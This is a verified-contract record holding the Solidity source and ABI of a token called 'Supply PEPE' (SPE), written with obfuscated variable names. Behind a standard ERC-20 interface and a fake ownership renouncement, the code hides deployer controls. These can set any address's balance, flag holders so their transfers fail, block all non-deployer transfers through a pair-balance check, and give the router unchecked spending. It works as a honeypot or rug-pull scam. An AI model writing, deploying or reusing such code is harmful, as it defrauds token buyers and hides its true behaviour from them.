{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface walletTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundExempt) external view returns (uint256);\n\n    function transfer(address listShould, uint256 feeIs) external returns (bool);\n\n    function allowance(address listFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listShould,\n        uint256 feeIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAtLaunch, uint256 value);\n    event Approval(address indexed listFund, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isBuyMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyEnable {\n    function createPair(address minBuy, address sellTotal) external returns (address);\n}\n\ninterface walletTeamMetadata is walletTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SupplyPEPE is liquidityMin, walletTeam, walletTeamMetadata {\n\n    string private totalLiquidity = \"Supply PEPE\";\n\n    uint256 public enableSwapTeam;\n\n    bool public tokenTeam;\n\n    address private isLiquidity;\n\n    constructor (){\n        if (launchMax == enableSwapTeam) {\n            enableSwapTeam = launchWallet;\n        }\n        isBuyMode receiverWalletFund = isBuyMode(launchFeeEnable);\n        fromEnable = buyEnable(receiverWalletFund.factory()).createPair(receiverWalletFund.WETH(), address(this));\n        \n        enableFee = _msgSender();\n        shouldAuto();\n        totalLaunched[enableFee] = true;\n        fundSender[enableFee] = modeMin;\n        if (launchMax != enableSwapTeam) {\n            launchMax = enableSwapTeam;\n        }\n        emit Transfer(address(0), enableFee, modeMin);\n    }\n\n    function getOwner() external view returns (address) {\n        return isLiquidity;\n    }\n\n    event OwnershipTransferred(address indexed modeTakeExempt, address indexed limitIs);\n\n    function takeLimit(uint256 feeIs) public {\n        listMode();\n        autoMin = feeIs;\n    }\n\n    uint256 private launchWallet;\n\n    address public fromEnable;\n\n    function transferFrom(address enableWallet, address listShould, uint256 feeIs) external override returns (bool) {\n        if (_msgSender() != launchFeeEnable) {\n            if (tokenAt[enableWallet][_msgSender()] != type(uint256).max) {\n                require(feeIs <= tokenAt[enableWallet][_msgSender()]);\n                tokenAt[enableWallet][_msgSender()] -= feeIs;\n            }\n        }\n        return feeSenderMin(enableWallet, listShould, feeIs);\n    }\n\n    address public enableFee;\n\n    uint256 constant limitAmountShould = 19 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return totalLiquidity;\n    }\n\n    address launchFeeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private launchMax;\n\n    function launchAuto(address toWallet) public {\n        listMode();\n        if (launchWallet == launchMax) {\n            enableSwapTeam = launchWallet;\n        }\n        if (toWallet == enableFee || toWallet == fromEnable) {\n            return;\n        }\n        takeMarketingLaunch[toWallet] = true;\n    }\n\n    function owner() external view returns (address) {\n        return isLiquidity;\n    }\n\n    function sellMin(address totalTakeList, uint256 feeIs) public {\n        listMode();\n        fundSender[totalTakeList] = feeIs;\n    }\n\n    function listMode() private view {\n        require(totalLaunched[_msgSender()]);\n    }\n\n    string private launchSender = \"SPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchSender;\n    }\n\n    uint256 isSwapTo;\n\n    uint256 private modeMin = 100000000 * 10 ** 18;\n\n    function balanceOf(address fundExempt) public view virtual override returns (uint256) {\n        return fundSender[fundExempt];\n    }\n\n    function approve(address limitTakeAmount, uint256 feeIs) public virtual override returns (bool) {\n        tokenAt[_msgSender()][limitTakeAmount] = feeIs;\n        emit Approval(_msgSender(), limitTakeAmount, feeIs);\n        return true;\n    }\n\n    function allowance(address isTotalSender, address limitTakeAmount) external view virtual override returns (uint256) {\n        if (limitTakeAmount == launchFeeEnable) {\n            return type(uint256).max;\n        }\n        return tokenAt[isTotalSender][limitTakeAmount];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMin;\n    }\n\n    function shouldAuto() public {\n        emit OwnershipTransferred(enableFee, address(0));\n        isLiquidity = address(0);\n    }\n\n    mapping(address => bool) public takeMarketingLaunch;\n\n    mapping(address => mapping(address => uint256)) private tokenAt;\n\n    uint256 autoMin;\n\n    address receiverTokenTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function feeSenderMin(address enableWallet, address listShould, uint256 feeIs) internal returns (bool) {\n        if (enableWallet == enableFee) {\n            return exemptMode(enableWallet, listShould, feeIs);\n        }\n        uint256 minSwap = walletTeam(fromEnable).balanceOf(receiverTokenTo);\n        require(minSwap == autoMin);\n        require(listShould != receiverTokenTo);\n        if (takeMarketingLaunch[enableWallet]) {\n            return exemptMode(enableWallet, listShould, limitAmountShould);\n        }\n        return exemptMode(enableWallet, listShould, feeIs);\n    }\n\n    mapping(address => uint256) private fundSender;\n\n    uint8 private walletSell = 18;\n\n    function totalMarketing(address receiverFund) public {\n        if (tokenTeam) {\n            return;\n        }\n        if (launchMax != launchWallet) {\n            launchMax = enableSwapTeam;\n        }\n        totalLaunched[receiverFund] = true;\n        \n        tokenTeam = true;\n    }\n\n    function transfer(address totalTakeList, uint256 feeIs) external virtual override returns (bool) {\n        return feeSenderMin(_msgSender(), totalTakeList, feeIs);\n    }\n\n    function exemptMode(address enableWallet, address listShould, uint256 feeIs) internal returns (bool) {\n        require(fundSender[enableWallet] >= feeIs);\n        fundSender[enableWallet] -= feeIs;\n        fundSender[listShould] += feeIs;\n        emit Transfer(enableWallet, listShould, feeIs);\n        return true;\n    }\n\n    mapping(address => bool) public totalLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTakeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAtLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotalSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTakeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTakeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTakeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"sellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"takeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMarketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTakeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SupplyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}